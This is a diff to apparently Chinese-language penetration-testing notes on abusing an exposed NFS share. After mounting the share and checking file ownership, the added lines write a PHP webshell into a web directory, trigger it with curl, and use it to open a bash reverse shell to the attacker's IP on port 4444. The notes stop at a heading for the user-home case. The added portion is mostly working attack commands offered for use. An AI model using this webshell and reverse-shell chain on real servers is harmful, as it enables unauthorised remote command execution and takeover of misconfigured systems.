@@ -7,4 +7,16 @@ showmount -d ip
 mount -nfs 服务器ip:挂载目录 本地目录
 将对方的共享NFS挂载到自己电脑上的目录
 touch /本地目录/文件
-ls -l
+ls -l /本地目录/文件
+检查文件权限与属主,如果是root继续后面的步骤
+
+如果是web目录
+# 1. 确认服务器跑 web(nmap 看 80/443)
+# 2. 写 webshell
+echo '<?php system($_GET["c"]); ?>' > ./nfs/shell.php
+# 3. 浏览器/nc 访问触发
+curl 'http://192.168.1.6/shell.php?c=id'
+# 4. 直接反弹
+curl 'http://192.168.1.6/shell.php?c=bash%20-i%20>%26%20/dev/tcp/你IP/4444%200>%261'
+
+如果是用户home
